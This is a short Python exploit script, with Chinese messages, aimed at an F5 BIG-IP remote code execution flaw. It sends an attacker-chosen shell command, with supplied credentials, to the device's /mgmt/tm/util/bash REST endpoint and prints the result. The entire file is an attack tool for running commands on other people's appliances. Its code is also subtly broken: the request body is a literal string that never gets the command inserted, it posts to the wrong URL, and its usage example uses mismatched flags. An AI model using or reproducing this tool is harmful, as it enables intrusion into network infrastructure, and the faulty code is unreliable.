import argparse
import requests,sys,random,re,json,base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def info():
	print("[+]============================================================")
	print("[+]=============F5-BIG远程代码执行漏洞===========================")
	print("[+]============================================================")


#漏洞exp
def exp(url,cmd,username,password):
	target_url = url + "/mgmt/tm/util/bash"
	bs = "{}:{}".format(username,password)
	password1 = str(base64.b64encode(bs.encode('utf-8')),'utf-8')
	print(password1)
	headers = {
		"Authorization": "Basic {}".format(password1),
		"X-F5-Auth-Token": "",
		"Content-Type": "application/json"
	}
	data = '{"command":"run","utilCmdArgs":"-c {}"}.format(cmd)'
	try:
		requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
		response = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
		if "commandResult" in response.text and response.status_code == 200:
			print("目标{}存在漏洞，执行的命令响应为：{}".format(url,json.load(response.text)["commandResult"]))
		else:
			print("目标{}不存在漏洞".format(url))
	except Exception as e :
		print("目标{}无法连接".format())



if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='F5-BIG远程代码执行漏洞',
									usage='use "python %(prog)s --help" for more information',
									formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument("-u", "--url",
						dest="url",
						help="target url (http://ip:port)"
						)

	parser.add_argument("-c", "--cmd",
						dest="cmd",
						help="command"
						)

	parser.add_argument("-user", "--username",
						dest="username",
						help="target username"
						)

	parser.add_argument("-pass", "--password",
						dest="password",
						help="target password"
						)
	args = parser.parse_args()
	info()
	if not args.url or not args.cmd or not args.username or not args.password:
		sys.exit('[*] Please assign url and cmd and username and password!\n[*] Examples python F5-big-rce.py -url http://ip:port -c whoami -u username -p password')

	exp(args.url,args.cmd,args.username,args.password)
